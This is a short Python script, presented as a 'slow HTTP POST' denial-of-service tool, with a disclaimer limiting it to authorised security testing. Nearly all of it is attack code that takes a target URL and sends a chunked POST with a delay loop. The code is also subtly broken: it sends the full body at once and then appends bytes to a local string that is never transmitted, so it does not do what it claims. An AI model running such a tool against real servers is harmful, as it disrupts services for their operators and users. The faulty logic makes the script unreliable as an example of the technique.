'''
This script is intended for educational and research purposes only. It should only be used on systems for which you have explicit permission to perform security testing. Unauthorized use of this script may result in violation of local, state, or federal laws. The authors of this script are not responsible for any misuse or damages caused by its use. Always exercise caution and common sense when conducting security testing.
'''
import argparse
import requests
import time 

def main():
    parser = argparse.ArgumentParser(description="Perform a slow HTTP POST attack.")
    parser.add_argument("target", help="Target URL or IP address")
    parser.add_argument("--data-range", type=int, nargs=2, metavar=("MIN", "MAX"), default=[1024 * 1024, 1024 * 1024], help="Range of data to send (default: 1 MB)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between sending each chunk of data (default: 0.1 seconds)")
    args = parser.parse_args()

    url = args.target
    min_data, max_data = args.data_range
    delay = args.delay

    data = "A" * min_data
    max_data = max(min_data, max_data)

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked",
    }

    with requests.post(url, headers=headers, data=data, stream=True) as response:
        for chunk in response.iter_content(chunk_size=1):
            data = data + "A" * (min(max_data - len(data), 1))
            time.sleep(delay)


if __name__ == "__main__":
    main()


